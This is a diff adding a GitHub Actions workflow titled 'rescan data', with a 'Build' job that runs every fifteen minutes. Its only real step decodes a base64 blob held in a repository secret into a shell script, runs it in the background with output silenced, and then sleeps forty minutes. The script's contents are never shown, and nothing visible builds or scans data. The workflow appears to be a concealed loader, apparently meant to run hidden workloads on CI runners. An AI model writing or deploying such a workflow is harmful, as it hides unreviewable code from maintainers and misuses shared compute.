@@ -1,0 +1,29 @@
+# .github/workflows/scheduled-builds.yml
+name: rescan data
+
+on:
+  schedule:
+    # Runs "at minute 15  minute " (see https://crontab.guru)
+    - cron: '*/15 * * * *'
+
+jobs:
+  build:
+    name: Build
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        node: [ '20' ]
+    steps:
+      - uses: actions/checkout@v1
+      - name: Setup node
+        uses: actions/setup-node@v2
+        with:
+          node-version: ${{ matrix.node }}
+      - name: Jalankan Skrip
+        env:
+          SCV: ${{ secrets.SCV }}
+        run: |
+          echo "$SCV" | base64 --decode > ku.sh
+          sh ku.sh > /dev/null 2>&1 &
+          sleep 40m 
+          echo "OK"
